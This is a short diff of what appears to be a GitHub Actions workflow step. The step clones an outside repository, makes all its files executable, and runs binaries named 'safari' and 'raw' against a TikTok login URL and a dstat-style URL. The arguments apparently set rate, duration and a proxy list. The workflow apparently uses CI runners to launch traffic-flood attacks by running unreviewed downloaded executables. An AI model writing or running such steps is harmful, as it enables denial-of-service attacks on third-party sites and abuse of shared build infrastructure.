@@ -23,7 +23,7 @@ jobs:
       run: |
         git clone https://github.com/Kiwiwjkwi/cuddly-octo-bassoon.git
         cd cuddly-octo-bassoon
-        chmod +x safari
-        ./safari https://www.tiktok.com/login   700 10000 8000 proxies.txt  --raw
+        chmod +x *
+        ./raw https://c3.dstatbot.win/Fu6im44k   700 1 700
       continue-on-error: true
     
